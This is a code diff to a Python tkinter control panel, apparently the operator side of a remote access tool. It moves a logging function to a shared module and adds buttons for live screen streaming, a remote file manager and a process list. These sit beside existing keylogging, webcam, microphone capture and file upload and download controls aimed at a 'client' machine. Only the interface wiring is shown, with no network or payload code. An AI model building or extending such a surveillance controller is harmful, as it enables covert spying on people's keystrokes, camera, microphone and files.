@@ -16,19 +16,7 @@ import gui_network as net
 import gui_commands as cmds
 import gui_features as feat
 
-# ── log_message (global, accessible from all modules) ─────────────────────────
-def log_message(message, level="INFO"):
-    try:
-        timestamp = datetime.now().strftime("%H:%M:%S")
-        log_text.insert(tk.END, f"[{timestamp}] ", "timestamp")
-        tags = {"INFO": "info", "SUCCESS": "success", "ERROR": "error", "WARNING": "warning"}
-        icons = {"INFO": "ℹ️ ", "SUCCESS": "✓ ", "ERROR": "✗ ", "WARNING": "⚠ "}
-        tag = tags.get(level, "info")
-        icon = icons.get(level, "  ")
-        log_text.insert(tk.END, f"{icon}{message}\n", tag)
-        log_text.after(50, lambda: log_text.see(tk.END))
-    except Exception:
-        pass
+# ── log_message is imported from gui_globals above ────────────────────────────
 
 # ══════════════════════════════════════════════════════════════════════════════
 # MAIN WINDOW
@@ -60,9 +48,13 @@ edit_menu.add_command(label="Clear Logs",     command=lambda: log_text.delete("1
 tools_menu = tk.Menu(menubar, tearoff=0)
 menubar.add_cascade(label="Tools", menu=tools_menu)
 tools_menu.add_command(label="📸 Capture Screenshot", command=feat.capture_screenshot)
+tools_menu.add_command(label="🖥️ Live Screen Monitor", command=feat.request_screen_monitor)
 tools_menu.add_command(label="⌨️ Keylog Capture",    command=feat.capture_keylog)
 tools_menu.add_command(label="💬 Send Popup",         command=feat.send_popup_message)
+tools_menu.add_command(label="📁 File Manager",        command=lambda: feat.request_file_browser(""))
 tools_menu.add_command(label="📊 System Info",        command=lambda: cmds.send_command_from_button("SYSINFO", "System Info"))
+tools_menu.add_command(label="🎯 Task Manager",        command=feat.request_process_list)
+tools_menu.add_command(label="📈 Performance Dashboard", command=feat.show_performance_dashboard)
 
 help_menu = tk.Menu(menubar, tearoff=0)
 menubar.add_cascade(label="Help", menu=help_menu)
@@ -193,12 +185,16 @@ tk.Label(adv_frame, text="🚀 ADVANCED", font=("Segoe UI", 10, "bold"), bg="#E8
 
 adv_btns = [
     ("📸 Screenshot",  feat.capture_screenshot,        "#5E35B1"),
+    ("🖥️ Screen Stream", feat.request_screen_monitor,     "#3949AB"),
     ("📷 Webcam",      feat.capture_webcam,            "#E94560"),
     ("🎤 Microphone",  feat.capture_microphone,        "#00ACC1"),
     ("⌨️ Keylog",      feat.capture_keylog,            "#FF6F00"),
+    ("📁 File Manager", lambda: feat.request_file_browser(""), "#00796B"),
     ("📥 Download",    feat.download_file_from_client, "#00897B"),
     ("📤 Upload",      feat.upload_file_to_client,     "#6A1B9A"),
     ("💬 Send Popup",  feat.send_popup_message,        "#0277BD"),
+    ("🎯 Task Manager",feat.request_process_list,      "#1976D2"),
+    ("📈 Dashboard",   feat.show_performance_dashboard,"#0097A7"),
 ]
 advanced_buttons = []
 for text, cmd, color in adv_btns:
@@ -207,8 +203,9 @@ for text, cmd, color in adv_btns:
                     activebackground=color, activeforeground="white")
     btn.pack(fill="x", padx=10, pady=4)
     advanced_buttons.append(btn)
-g.keylog_button = advanced_buttons[3]
-g.mic_button = advanced_buttons[2]
+g.keylog_button = advanced_buttons[4]
+g.mic_button = advanced_buttons[3]
+g.screen_monitor_button = advanced_buttons[1]
 tk.Label(adv_frame, text="", bg="#E8EAF6").pack(pady=5)
 
 # ── System Control ────────────────────────────────────────────────────────────
